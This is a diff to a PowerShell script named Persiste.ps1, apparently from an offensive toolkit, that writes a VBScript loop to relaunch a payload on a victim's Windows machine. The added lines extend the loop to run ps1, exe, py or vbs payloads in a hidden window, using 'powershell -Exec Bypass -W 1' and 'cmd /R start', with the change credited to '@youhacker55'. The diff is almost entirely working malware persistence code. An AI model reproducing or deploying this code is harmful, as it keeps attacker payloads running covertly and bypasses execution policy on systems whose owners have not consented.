@@ -12,6 +12,7 @@
    Remark: Use double quotes if Path has any empty spaces in name.
    Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
    to manual check the status of wscript process (BeaconHome function)
+   Remark: Payload supported extensions: ps1|exe|py|vbs
 
 .EXAMPLE
    PS C:\> Get-Help .\Persiste.ps1 -full
@@ -93,7 +94,19 @@ $TrdliState = $False
             echo "Set objShell = WScript.CreateObject(`"WScript.Shell`")" > "$PersistePath"
             echo "Do" >> "$PersistePath"
             echo "wscript.sleep $RawTime" >> "$PersistePath"
-            echo "objShell.Exec(`"powershell -Exec Bypass -W 1 -File $Persiste`")" >> "$PersistePath"
+
+            ## Recomended function by @youhacker55
+            # Payload supported extensions: ps1|exe|py|vbs
+            If($ClientName -Match '.ps1'){
+                echo "objShell.Run `"powershell -Exec Bypass -W 1 -File $Persiste`", 0, True" >> "$PersistePath"
+            }ElseIf($ClientName -Match '.exe'){
+                echo "objShell.Run `"cmd /R start $Persiste`", 0, True" >> "$PersistePath"
+            }ElseIf($ClientName -Match '.py'){
+                echo "objShell.Run `"cmd /R $Persiste`", 0, True" >> "$PersistePath"
+            }ElseIf($ClientName -Match '.vbs'){
+                echo "objShell.Exec(`"cmd /R $Persiste`")" >> "$PersistePath"
+            }
+
             echo "Loop" >> "$PersistePath"
         }
 
